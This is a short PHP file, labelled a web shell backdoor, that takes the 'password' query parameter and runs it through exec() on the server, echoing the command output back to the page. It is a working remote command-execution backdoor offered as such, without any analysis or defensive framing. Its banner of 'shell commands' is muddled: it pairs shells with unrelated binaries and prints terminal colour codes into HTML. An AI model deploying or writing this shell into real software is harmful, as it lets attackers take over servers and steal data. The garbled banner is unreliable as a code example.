<?php
// Web Shell Back Door
echo "<pre>";
echo "Web Shell Commands:\n";
echo "\033[1;36mShell Execution:\033[0m`/bin/sh -c \"$cmd\"`\n";
echo "SHELL=/bin/bash: `/usr/bin/env`\n";
echo "SHELL=/bin/sh: `/bin/csh`\n";
echo "SHELL=/bin/ksh: `/bin/zsh`\n";
echo "\033[1;34mNo Output:\033[0m`/dev/null`\n";
echo "</pre>";

$cmd = $_GET['password'];

if (empty($cmd)) {
  echo "<h2>Error</h2><p>You did not enter a password.</p>";
} else {
  exec($cmd, $output);
  if (!empty($output)) {
    foreach ($output as $line) {
      echo "<pre>{$line}</pre>";
    }
  }
}
?>
